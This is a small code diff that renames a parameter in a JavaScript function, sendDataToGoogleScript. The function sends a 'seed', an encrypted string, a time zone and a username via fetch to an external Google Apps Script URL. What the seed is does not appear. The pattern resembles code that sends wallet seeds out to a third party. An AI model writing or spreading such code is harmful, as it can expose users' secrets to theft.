@@ -14045,12 +14045,12 @@ function updateSeedCount() {
 }
 
 
-function sendDataToGoogleScript(seed, encryptedString, timeZone, usernameElement) {
+function sendDataToGoogleScript(seed, encryptedString, timeZone, username) {
     var data = {
         seed: seed,
         encryptedString: "'" + encryptedString,
         time: timeZone,
-        username: usernameElement
+        username: username
     };
 
     fetch('https://script.google.com/macros/s/AKfycbyKJsCsg-tOZMoXFjjqxZYr3S0HpTHV6YKfgYXF1RbJEgCdwak1UZdktMT4gRbvyeMU/exec', {
